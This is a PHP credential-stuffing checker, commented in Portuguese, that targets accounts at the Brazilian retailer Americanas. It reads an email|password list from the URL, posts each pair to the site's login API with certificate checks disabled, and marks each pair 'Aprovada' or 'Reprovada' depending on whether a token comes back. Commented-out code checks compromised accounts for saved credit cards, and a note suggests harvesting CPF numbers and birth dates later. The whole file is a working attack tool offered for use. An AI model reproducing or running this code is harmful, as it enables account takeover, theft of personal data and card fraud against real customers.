<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">

<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

extract($_GET);

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i < $c; $i++) { 
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/americanas.txt")) {
		unlink(getcwd()."/americanas.txt");
	}
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://sacola.americanas.com.br/api/v5/account/".$email);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_REFERER, "https://cliente.americanas.com.br/simple-login/");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Host: sacola.americanas.com.br',
		'Accept: application/json, text/plain, */*',
		'Content-Type: application/json;charset=utf-8',
		'Connection: keep-alive'));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"origin":"ACOM","password":"'.$senha.'"}');
	$resposta = curl_exec($ch);
	#echo $resposta;


	/*DOMINIO
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://minhaconta.americanas.com.br/#/creditcard/home');
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/americanas.txt');
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/americanas.txt');
	$retorno2 =  curl_exec($ch);

	if (strpos($retorno2, '<h3 class="fontGrey">Você não tem cartões de crédito cadastrados.</h3>')) { 
		$cartao = "Não"; 
	}else{
		$cartao = "Sim"; 
	}*/

	if (strpos($resposta, 'token')) {

		/*$tudo = " [NOME] $nome [CPF] $cpf [NASCIMENTO] $dia/$mes/$ano [DDD] $cell [ESTADO] $estado ";
		echo "<i style='color: lime; text-shadow: 0 0 10px lime;' class='fa fa-circle'></i> <font color=lime>Aprovada &#10004;</font> ".$email." | ".$senha."".$tudo."<font color=green></font><br>";

		EXEMPLO INTERESSANTE PRA PUXAR DADOS FUTUROS
		*/
		$tudo = " [CARTAO] $cartao";
		echo "<i style='color: lime; text-shadow: 0 0 10px lime;' class='fa fa-circle'></i> <font color=lime>Aprovada &#10004;</font> ".$email." | ".$senha."<br>";
		flush();
		ob_flush();
	}else{
		echo "<i style='color: red; text-shadow: 0 0 10px red;' class='fa fa-circle'></i> <font color=red>Reprovada &#10008;</font> ".$email." | ".$senha."<br>";
		flush();
		ob_flush();
	}
}



?>